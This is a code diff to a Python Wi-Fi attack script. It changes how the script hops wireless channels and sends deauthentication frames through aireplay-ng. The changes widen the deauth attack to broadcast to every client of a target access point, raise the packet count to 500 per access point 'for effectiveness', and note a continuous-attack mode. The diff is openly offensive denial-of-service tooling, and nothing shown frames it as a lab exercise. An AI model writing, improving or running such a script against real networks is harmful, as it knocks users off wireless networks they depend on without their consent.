@@ -56,19 +56,24 @@ def hop_channel(interface, channel):
 	"""
 	global current_channel
 	# Use iwconfig to change the channel on the wireless interface
-	process = subprocess.Popen(["sudo", "iwconfig", interface, "channel", str(channel)], stdout=subprocess.PIPE, stderr = subprocess.PIPE)
+	process = subprocess.Popen(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.PIPE, stderr = subprocess.PIPE)
 	stdout, stderr = process.communicate()
+	
+	# Check for errors
+	if process.returncode != 0 and stderr:
+		print(f"Warning: Failed to hop to channel {channel}: {stderr.decode().strip()}")
+	
 	current_channel = channel
 	print("Hopped to channel", channel)
 
 
 def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 	"""
-	Send deauthentication packets to a specific access point.
+	Send deauthentication packets to disconnect clients from an access point.
 	
-	This function uses aireplay-ng to send deauth packets which will disconnect
-	clients from the target access point. It automatically switches to the correct
-	channel before attacking.
+	This function uses aireplay-ng to send deauth packets to ALL clients connected
+	to the target AP using broadcast addressing. This is more effective than
+	targeting the AP alone.
 	
 	Args:
 		interface (str): The wireless interface in monitor mode
@@ -92,10 +97,22 @@ def deauth(interface, num_pkts_to_send, ap_mac, ap_channel, ap_essid):
 		# Record start time for performance measurement
 		date = datetime.datetime.now()
 		
-		# Execute aireplay-ng deauth attack
-		# -0 specifies deauth attack, -a specifies the AP MAC address
-		process = subprocess.Popen(['sudo', 'aireplay-ng', "-0", str(num_pkts_to_send), "-a", ap_mac, interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		# Execute aireplay-ng deauth attack with broadcast client address
+		# -0 = deauth attack
+		# -a = AP MAC address (target access point)
+		# -c = Client MAC address (FF:FF:FF:FF:FF:FF = broadcast to ALL clients)
+		# This sends deauth frames that appear to come from the AP to all connected clients
+		cmd = ['aireplay-ng', '-0', str(num_pkts_to_send), '-a', ap_mac, '-c', 'FF:FF:FF:FF:FF:FF', interface]
+		
+		print(f"  Command: {' '.join(cmd)}")
+		process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		stdout, stderr = process.communicate()
+		
+		# Check for errors
+		if stderr:
+			err_msg = stderr.decode().strip()
+			if err_msg and "ioctl" not in err_msg:  # Ignore ioctl warnings
+				print(f"  Warning: {err_msg}")
 		
 		# Calculate and display how long the attack took
 		date2 = datetime.datetime.now()
@@ -404,7 +421,8 @@ if 'SUDO_USER' in os.environ:
 else:
     dump_dir = os.path.expanduser("~/dump")
 
-deauth_num_pkts = 100             # Number of deauth packets to send per attack
+deauth_num_pkts = 500             # Number of deauth packets per AP (increased for effectiveness)
+                                   # 0 = continuous attack (use with caution)
 iface = "wlan1"                   # Wireless interface in monitor mode (usually external adapter)
 deauth_max_seconds = 30           # Time between scans (unused in current implementation)
                                    # Note: Could be used to refresh targets periodically
